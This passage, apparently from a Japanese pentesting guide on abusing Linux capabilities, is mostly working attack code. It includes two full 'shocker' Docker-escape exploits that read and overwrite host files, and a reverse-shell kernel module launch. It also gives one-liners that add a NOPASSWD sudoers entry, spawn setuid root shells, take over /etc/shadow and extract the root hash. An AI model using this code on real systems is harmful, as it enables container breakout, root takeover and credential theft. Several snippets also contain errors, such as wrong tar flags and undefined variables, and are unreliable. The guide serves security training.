nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「Abusing SYS_MODULE Capability」laboratory からコピーされました**

この technique の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) にあります。

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) により、process は**file の読み取り、および directory の読み取りと実行に関する permission を bypass**できます。主な用途は、file の検索または読み取りです。ただし、process が `open_by_handle_at(2)` function を使用することも可能になり、process の mount namespace 外にある file を含め、あらゆる file に access できます。`open_by_handle_at(2)` で使用される handle は、`name_to_handle_at(2)` によって取得される非透過的な identifier であることが想定されていますが、改ざんに対して脆弱な inode number などの機密情報を含む可能性があります。この capability の exploit の可能性は、特に Docker container の context において、Sebastian Krahmer による shocker exploit で実証されており、[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で分析されています。
**これは、file の read permission check と directory の read/execute permission check を bypass できることを意味します。**

**binary を使用した Example**

binary はあらゆる file を読み取れるようになります。そのため、tar のような file にこの capability がある場合、shadow file を読み取れるようになります：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2の例**

この場合、**`python`** binaryにこのcapabilityがあるとします。root filesを一覧表示するには、次のようにします。
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
そして、ファイルを読み取るには、次のようにします。
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

以下を使用して、docker container 内で有効な capabilities を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、**DAC_READ_SEARCH** capability が有効になっていることを確認できます。その結果、container は**プロセスを debug**できます。

以下の exploit の仕組みについては、[https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で学べますが、要約すると、**CAP_DAC_READ_SEARCH**は permission check なしで file system を traverse できるだけでなく、_**open_by_handle_at(2)**_ に対するあらゆる check も明示的に削除するため、**他の process が開いている sensitive files に our process がアクセスできる可能性があります**。

この permission を悪用して host から files を read する original exploit は、こちらにあります：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、read したい file を first argument として指定し、その内容を file に dump できるようにした**modified version**です。
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> この exploit では、host 上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この modified version では /etc/hostname を使用します。exploit が動作しない場合は、別のファイルを設定する必要があるかもしれません。host 上に mount されたファイルを見つけるには、mount command を実行します:

![CAP SYS MODULE - CAP DAC READ SEARCH: この exploit では、host 上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この modified version では...](<../../images/image (407) (1).png>)

**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「Abusing DAC_READ_SEARCH Capability」laboratory からコピーされました。**


## CAP_DAC_OVERRIDE

**これは、任意のファイルに対する write permission checks を bypass できることを意味します。つまり、任意のファイルに write できます。**

**privileges を escalate するために overwrite できるファイルは多数あります。** [**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**binary を使った Example**

この Example では vim にこの capability があるため、_passwd_、_sudoers_、_shadow_ などの任意のファイルを変更できます:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**バイナリを使用した例 2**

この例では、**`python`** バイナリにこの capability が付与されています。python を使用して、任意のファイルを上書きできます:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**環境 + CAP_DAC_READ_SEARCH の例（Docker breakout）**

Docker コンテナ内で有効な capabilities は、次のコマンドで確認できます。
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
まず、ホストの任意のファイルを読み取るために [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) セクションを読み、**exploit を compile**してください。\
次に、ホストのファイルシステム内の**任意のファイルに write**できる、以下のバージョンの shocker exploit を**compile**してください：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker containerから**escape**するには、ホストから`/etc/shadow`と`/etc/passwd`を**download**し、それらに**new user**を**add**して、`shocker_write`を使用して上書きできます。その後、**ssh**経由で**access**します。

このtechniqueの**code**は、[**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)の「Abusing DAC_OVERRIDE Capability」labからコピーしたものです。

## CAP_CHOWN

**これは、任意のfileのownershipを変更できるという意味です。**

**binaryを使用したExample**

**python** binaryにこのcapabilityがあると仮定します。この場合、**shadow** fileの**owner**を変更し、**root password**を**change**して、privilegesをescalateできます:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、この capability を持つ **`ruby`** バイナリの場合:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**これは、あらゆるファイルの権限を変更できることを意味します。**

**binary の例**

Python にこの capability がある場合、shadow ファイルの権限を変更し、**root パスワードを変更**して、権限を昇格できます:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**これは、作成されたプロセスの実効ユーザー ID を設定できることを意味します。**

**バイナリを使った例**

python にこの **capability** がある場合、これを非常に簡単に悪用して root へ権限昇格できます:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**これは、作成されたプロセスの実効グループIDを設定できるという意味です。**

**権限昇格のために上書きできるファイルは多数あります。**[**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリを使った例**

この場合、任意のグループになりすませるため、グループが読み取れる興味深いファイルを探す必要があります。
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
読み取りまたは書き込みによって権限昇格に悪用できるファイルを見つけたら、次のコマンドで **interesting group** になりすました shell を取得できます。
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
この場合、shadow グループになりすましたため、ファイル `/etc/shadow` を読み取れます。
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

両方の capabilities が同じ helper で利用可能な場合、実用的な chain は次のとおりです。

1. EGID を `shadow`（または別の privileged group）に切り替える。
2. `/etc/shadow` に対して `chown` を使用し、group を `shadow` に維持したまま UID を自分の UID に設定する。
3. target hash を読み取り、crack/pivot する。
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
これは直接完全な root 権限を必要とせず、credential reuse を通じた pivoting には通常十分です。

**docker** がインストールされている場合、**docker group** を **impersonate** し、[**docker socket** と通信して privileges を escalate](#writable-docker-socket) するために悪用できます。

## CAP_SETFCAP

**これは、files と processes に capabilities を設定できることを意味します**

**バイナリを使った例**

python にこの **capability** がある場合、簡単に悪用して privileges を root まで escalate できます:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> CAP_SETFCAP を使用して binary に新しい capability を設定すると、この cap を失うことに注意してください。

[SETUID capability](linux-capabilities.md#cap_setuid) を取得したら、そのセクションで privilege escalation の方法を確認できます。

**environment を使用した Example（Docker breakout）**

デフォルトでは、**Docker の container 内の proccess には CAP_SETFCAP capability が付与されています**。次のように実行して確認できます。
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この capability を使うと、**バイナリに他の任意の capability を付与できる**ため、このページで説明されている**他の capability breakout を悪用して**、container から**escaping**できるのではないかと考えられます。\
しかし、たとえば gdb バイナリに CAP_SYS_ADMIN と CAP_SYS_PTRACE を付与しようとすると、付与自体はできますが、その後**バイナリを実行できなくなります**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[docs](https://man7.org/linux/man-pages/man7/capabilities.7.html)より: _Permitted: これは、threadが取得できるeffective capabilitiesの**制限された上位集合**です。また、effective setに**CAP_SETPCAP** capabilityを持たないthreadがinheritable setに追加できるcapabilitiesの制限された上位集合でもあります。_\
Permitted capabilitiesは、使用できるcapabilitiesを制限しているように見えます。\
しかし、Dockerはデフォルトで**CAP_SETPCAP**も付与するため、**inheritable setに新しいcapabilitiesを設定**できる可能性があります。\
ただし、このcapのdocumentationには次のように記載されています: _CAP_SETPCAP : \[…] **calling threadのbounding setにある任意のcapabilityを、そのinheritable setに追加する**。_\
つまり、inheritable setに追加できるのはbounding setにあるcapabilitiesだけのようです。したがって、**CAP_SYS_ADMINやCAP_SYS_PTRACEのような新しいcapabilitiesをinherit setに追加してprivilege escalationすることはできません**。

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`/dev/mem`、`/dev/kmem`、`/proc/kcore`へのアクセス、`mmap_min_addr`の変更、`ioperm(2)`および`iopl(2)` system callsへのアクセス、さまざまなdisk commandsなど、多数のsensitive operationsを提供します。このcapabilityによって`FIBMAP ioctl(2)`も有効になりますが、これが[過去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)に問題を引き起こしたことがあります。man pageによると、これはholderが`他のdevicesに対してdevice-specific operationsを広範囲に実行する`ことも可能にします。

これは**privilege escalation**や**Docker breakout**に役立つ可能性があります。

## CAP_KILL

**これは、任意のprocessをkillできるという意味です。**

**binaryを使った例**

**`python`** binaryにこのcapabilityがあるとします。**serviceまたはsocketのconfiguration**（またはserviceに関連する任意のconfiguration file）を**変更できる**場合、それにbackdoorを仕込み、その後、そのserviceに関連するprocessをkillして、新しいconfiguration fileがbackdoor付きで実行されるのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**killによるPrivesc**

kill capabilitiesがあり、**rootとして実行されているnode program**（または別のユーザーとして実行されているもの）がある場合、**signal SIGUSR1**を送信して、接続可能な状態で**node debuggerを開かせる**ことができる可能性があります。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**これは、任意のポート（特権ポートを含む）でlistenできることを意味します。** このcapabilityだけで直接privilegesをescalateすることはできません。

**binaryの例**

**`python`**にこのcapabilityがある場合、任意のポートでlistenでき、そこから任意の別のポートへ接続することもできます（サービスによっては、特定の特権ポートからの接続を要求するものがあります）。

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability により、process は **RAW および PACKET sockets を作成**でき、任意の network packets を生成して送信できます。これにより、packet spoofing、traffic injection、network access controls の回避など、containerized environments における security risks が発生する可能性があります。悪意のある攻撃者は、これを悪用して container の routing に干渉したり、特に十分な firewall protections がない場合に host network security を侵害したりする可能性があります。さらに、**CAP_NET_RAW** は、RAW ICMP requests を介した ping などの操作を privileged containers でサポートするために不可欠です。

**これは traffic を sniff できることを意味します。** この capability だけで直接 privileges を escalate することはできません。

**binary の例**

binary **`tcpdump`** にこの capability がある場合、network information を capture できます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
**バイナリ 2 の例**

以下の例は、"**lo**"（**localhost**）interface の traffic を intercept する際に役立つ **`python2`** code です。この code は、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) の "_The Basics: CAP-NET_BIND + NET_RAW_" lab のものです。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability は、公開されている network namespaces 内の firewall settings、routing tables、socket permissions、network interface settings など、**network configurations を変更する**権限を保持者に与えます。また、network interfaces の **promiscuous mode** を有効化できるため、namespace をまたいだ packet sniffing も可能になります。

**バイナリを使った例**

**python binary** にこれらの capabilities が付与されているとします。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**inode 属性を変更できるという意味です。** この capability だけで直接 privilege escalation を行うことはできません。

**バイナリを使用した例**

ファイルが immutable で、python にこの capability があることが分かった場合、**immutable 属性を削除してファイルを変更可能にできます。**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> 通常、この immutable 属性の設定と解除には以下を使用します:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` system call の実行を可能にします。これにより、既知の脆弱性を悪用して `chroot(2)` 環境から escape できる可能性があります:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、system restart のための `reboot(2)` system call の実行を可能にするだけでなく、特定の hardware platform 向けに調整された `LINUX_REBOOT_CMD_RESTART2` などの command も実行できます。さらに、Linux 3.17 以降では、新しい crash kernel または signed crash kernel をそれぞれロードするための `kexec_load(2)` および `kexec_file_load(2)` も使用できます。

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は Linux 2.6.37 で、より広範な **CAP_SYS_ADMIN** から分離され、特に `syslog(2)` call を使用する権限を付与するものとして導入されました。この capability により、kernel address の公開を制御する `kptr_restrict` setting が 1 の場合でも、`/proc` および同様の interface 経由で kernel address を確認できます。Linux 2.6.39 以降、`kptr_restrict` の default は 0 であり、kernel address が公開されます。ただし、多くの distribution は security 上の理由から、これを 1 (uid 0 以外には address を隠す) または 2 (常に address を隠す) に設定しています。

さらに、`dmesg_restrict` が 1 に設定されている場合、**CAP_SYSLOG** により `dmesg` output に access できます。これらの変更にもかかわらず、歴史的な経緯により **CAP_SYS_ADMIN** には `syslog` operation を実行する権限が残されています。

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常の file、FIFO (named pipe)、または UNIX domain socket の作成にとどまらず、`mknod` system call の機能を拡張します。具体的には、以下を含む special file の作成を可能にします:

- **S_IFCHR**: terminal などの character special file。
- **S_IFBLK**: disk などの block special file。

この capability は、device file の作成を必要とする process に不可欠であり、character device または block device を介した hardware への直接 interaction を可能にします。

これは default docker capability です ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。

この capability により、以下の条件下で host 上の privilege escalation (full disk read 経由) が可能になります:

1. host への initial access がある (Unprivileged)。
2. container への initial access がある (Privileged (EUID 0) かつ effective `CAP_MKNOD`)。
3. host と container が同じ user namespace を共有している。

**Container 内で Block Device を作成して Access する手順:**

1. **Standard User として Host 上で:**

- `id` を使用して現在の user ID を確認します。例: `uid=1000(standarduser)`。
- target device を特定します。例: `/dev/sdb`。

2. **`root` として Container 内で:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **ホストに戻って:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
このアプローチにより、standard userは、shared user namespacesとデバイスに設定された権限を悪用して、containerを介して`/dev/sdb`にアクセスし、データを読み取れる可能性があります。

### CAP_SETPCAP

**CAP_SETPCAP**は、プロセスが別のプロセスの**capability setsを変更**できるようにし、effective、inheritable、permitted setsへのcapabilitiesの追加または削除を可能にします。ただし、プロセスが変更できるのは、自身のpermitted setに保持しているcapabilitiesのみです。これにより、別のプロセスの権限を自身の権限を超えて昇格させることはできません。最近のkernel updatesではこれらのルールが厳格化され、`CAP_SETPCAP`は自身またはその子孫のpermitted sets内のcapabilitiesを減少させる場合にのみ使用できるよう制限されています。これはsecurity risksの軽減を目的としています。使用するには、effective setに`CAP_SETPCAP`があり、対象となるcapabilitiesがpermitted setに含まれている必要があります。変更には`capset()`を使用します。これは、privilege managementとsecurity enhancementにおける`CAP_SETPCAP`の主要な機能と制限をまとめたものです。

**`CAP_SETPCAP`**は、プロセスが**別のプロセスのcapability setsを変更**できるようにするLinux capabilityです。別のプロセスのeffective、inheritable、permitted capability setsに対して、capabilitiesを追加または削除する機能を提供します。ただし、このcapabilityの使用方法にはいくつかの制限があります。

